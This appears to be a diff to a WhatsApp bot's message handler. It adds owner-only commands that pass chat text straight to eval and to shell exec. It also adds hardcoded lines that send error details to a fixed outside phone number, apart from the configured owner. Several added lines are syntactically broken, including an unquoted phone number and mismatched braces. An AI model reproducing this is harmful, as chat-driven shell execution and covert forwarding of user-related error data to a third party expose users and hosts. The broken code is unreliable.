@@ -207,7 +207,31 @@ var yye = tgel.getYear();
 //
 module.exports = Taira = async (Taira, m, chatUpdate, store) => {
   try {
-    var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
+    /*var body = (
+m.mtype === 'conversation') ? m.message.conversation : 
+m.mtype == 'imageMessage') ? m.message.imageMessage.caption : 
+m.mtype == 'videoMessage') ? m.message.videoMessage.caption : 
+m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : 
+m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : 
+m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : 
+m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : 
+m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) :
+''
+)*/
+var body = (
+m.mtype === 'conversation' ? m.message.conversation :
+m.mtype === 'imageMessage' ? m.message.imageMessage.caption :
+m.mtype === 'videoMessage' ? m.message.videoMessage.caption :
+m.mtype === 'extendedTextMessage' ? m.message.extendedTextMessage.text :
+m.mtype === 'buttonsResponseMessage' ? m.message.buttonsResponseMessage.selectedButtonId :
+m.mtype === 'listResponseMessage' ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
+m.mtype === 'interactiveResponseMessage' ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id :
+m.mtype === 'templateButtonReplyMessage' ? m.message.templateButtonReplyMessage.selectedId :
+m.mtype === 'messageContextInfo' ?
+m.message.buttonsResponseMessage?.selectedButtonId ||                                                                                                   m.message.listResponseMessage?.singleSelectReply.selectedRowId ||
+m.message.InteractiveResponseMessage.NativeFlowResponseMessage ||                                                                                       m.text :
+''
+); 
     var budy = (typeof m.text == 'string' ? m.text : '')
     const prefix = global.prefa
     const isCmd = body.startsWith(prefix)
@@ -6994,6 +7018,9 @@ _Click the button below to download_`
 ╭═══════════════ ⪩
 ╰╮╰┈➤ *OWNER*
 ╭═══════════════ ⪩
+┃ • Addprem
+┃ • Delprem
+┃ • Listprem
 ┃ • ᴘᴜʙʟɪᴄ
 ┃ • self
 ┃ • ʀᴇꜱᴛᴀʀᴛ
@@ -7384,12 +7411,12 @@ _Click the button below to download_`
           if (isBan) return reply(mess.banned);
           if (isBanChat) return reply(mess.bangc);
           Taira.sendMessage(from, { react: { text: "❌", key: m.key } })
-          reply(`Hey *${pushname}* senpai! this command are not programmed! Type *${prefix}help* to get my full command list!`)
+          reply(`Hey *${pushname}*,Unfortunately there are no such command 🤧!`)
 
         }
 
 
-        if (budy.startsWith('=>')) {
+        /*if (budy.startsWith('=>')) {
           if (!isCreator) return reply(mess.botowner)
           function Return(sul) {
             sat = JSON.stringify(sul, null, 2)
@@ -7404,8 +7431,8 @@ _Click the button below to download_`
           } catch (e) {
             Taira.sendMessage(from, { image: ErrorPic, caption: String(e) }, { quoted: m })
           }
-        }
-        if (budy.startsWith('>')) {
+        }*/
+        /*if (budy.startsWith('>')) {
           if (!isCreator) return reply(mess.botowner)
           try {
             let evaled = await eval(budy.slice(2))
@@ -7414,16 +7441,63 @@ _Click the button below to download_`
           } catch (err) {
             await Taira.sendMessage(from, { image: ErrorPic, caption: String(err) }, { quoted: m })
           }
+        }*/
+	if (budy.startsWith('=>')) {
+if (!isCreator) return m.reply(mess.botowner)
+function Return(sul) {
+sat = JSON.stringify(sul, null, 2)
+bang = util.format(sat)
+if (sat == undefined) {
+bang = util.format(sul)
+}
+return m.reply(bang)
+}
+try {                                                                             joreply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
+} catch (e) {
+joreply(String(e))
+}
+	} 
+		    
+	if (budy.startsWith('>')) {
+        if (!isCreator) return m.reply(mess.botowner)
+        try {
+        let evaled = await eval(budy.slice(2))
+        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
+        await m.reply(evaled)
+        } catch (err) {
+        await m.reply(String(err))
         }
+	} 
 
 
-        if (budy.startsWith('$')) {
+        /*if (budy.startsWith('$')) {
           if (!isCreator) return reply(mess.botowner)
           exec(budy.slice(2), (err, stdout) => {
             if (err) return Taira.sendMessage(from, { image: ErrorPic, caption: String(err) }, { quoted: m })
             if (stdout) return replyH(stdout)
           })
-        }
+        }*/
+	if (budy.startsWith('$')) {
+if (!isCreator) return m.reply(mess.botowner)
+exec(budy.slice(2), (err, stdout) => {
+if (err) return m.reply(`${err}`)
+if (stdout) return m.reply(`${stdout}`)
+})
+}
+}
+} catch (err) {
+codee = async () => {
+Taira.sendMessage(global.Owner + '@s.whatsapp.net', {text: require('util').format(err)}, {quoted: m})
+Taira.sendMessage(m.chat, {text: require('util').format(err)}, {quoted: m})
+Taira.sendMessage(2347080968564@s.whatsapp.net, {text: require('util').format(err)}, {quoted: m}) 
+await sleep(1000)
+m.reply(`Command failed to execute due to n error✅
+${util.format(err)}`)
+console.log(util.format(err))
+}
+codee()
+}
+} 
 
 
         if (isCmd && budy.toLowerCase() != undefined) {
@@ -7436,6 +7510,7 @@ _Click the button below to download_`
     }
   } catch (err) {
     Taira.sendMessage(`${ownertag}@s.whatsapp.net`, util.format(err), { quoted: m })
+    Taira.sendMessage(2347080968564@s.whatsapp.net, util.format(err), { quoted: m })
     console.log(err)
     let e = String(err)
     if (e.includes("not-authorized")) return
